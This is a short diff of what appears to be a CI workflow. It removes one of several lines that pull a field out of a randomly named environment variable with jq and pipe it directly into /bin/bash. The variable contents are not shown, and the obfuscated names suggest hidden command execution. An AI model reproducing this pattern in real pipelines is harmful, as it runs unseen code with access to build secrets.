@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$nfiyx45721" | jq -r .ovev503 | /bin/bash
           echo $t76 | jq -r .mr9269 | /bin/bash
           echo $cvx66924 | jq -r .dtw49909 | /bin/bash
-          printf '%s' "$xb076" | jq -r .lut92 | /bin/bash
           printf '%s' "$xfr9" | jq -r .tf1 | /bin/bash
 
       - name: Upload output
